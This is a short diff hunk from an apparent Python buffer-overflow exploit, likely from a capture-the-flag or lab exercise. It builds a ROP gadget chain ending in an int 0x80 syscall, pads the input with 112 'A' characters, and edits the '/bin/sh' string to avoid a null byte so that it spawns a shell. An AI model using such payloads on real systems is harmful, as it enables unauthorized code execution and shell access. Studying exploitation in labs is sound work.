@@ -41,4 +41,4 @@ gadget_chain += pack("<I", sh_addr)
 # int $0x80
 gadget_chain += pack("<I", 0x080494f9)
  
-print 'A' * 112 + gadget_chain + 'AAAA' + '/bin/sh\x00'
+print 'A' * 112 + gadget_chain + 'AAAA' + '/bin//sh'
